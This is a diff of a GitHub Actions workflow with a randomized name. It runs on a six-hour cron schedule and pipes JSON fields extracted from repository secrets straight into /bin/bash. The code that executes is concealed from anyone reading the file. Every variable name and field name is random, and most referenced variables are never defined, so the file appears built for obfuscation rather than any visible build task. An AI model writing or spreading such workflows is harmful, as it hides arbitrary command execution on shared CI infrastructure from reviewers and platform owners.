@@ -3,29 +3,19 @@ name: gonghanlu6721
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
+    - cron: '33 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gonghanlu6721
         env:
-          lcpgy1519: ${{ secrets.lcpgy1519 }}
+          l771: ${{ secrets.l771 }}
         run: |
-          echo $lcpgy1519 | jq -r .gpt75538 | /bin/bash
-          echo $cwy0238 | jq -r .jn239 | /bin/bash
-          echo $me37635 | jq -r .cb657 | /bin/bash
-          echo $j40272 | jq -r .hgmwc306 | /bin/bash
-          echo $rsdu02 | jq -r .yngwt66757 | /bin/bash
-          echo $ev95 | jq -r .ghh9054 | /bin/bash
-          echo $obxpz61 | jq -r .b32595 | /bin/bash
-          echo $n8 | jq -r .ke05 | /bin/bash
-          echo $moq6871 | jq -r .msbco29 | /bin/bash
-          echo $n50 | jq -r .yvg28 | /bin/bash
-          echo $p6 | jq -r .tk019 | /bin/bash
-          echo $lm7 | jq -r .hq94988 | /bin/bash
-          echo $szb4 | jq -r .cy069 | /bin/bash
-          echo $f49166 | jq -r .jp0123 | /bin/bash
+          echo $l771 | jq -r .uzs905 | /bin/bash
+          echo $mqas799 | jq -r .utlz4 | /bin/bash
+          echo $zmbqg8104 | jq -r .vbm287 | /bin/bash
+          echo $dzw027 | jq -r .ssu69607 | /bin/bash
+          echo $nj6 | jq -r .mgl66 | /bin/bash
 
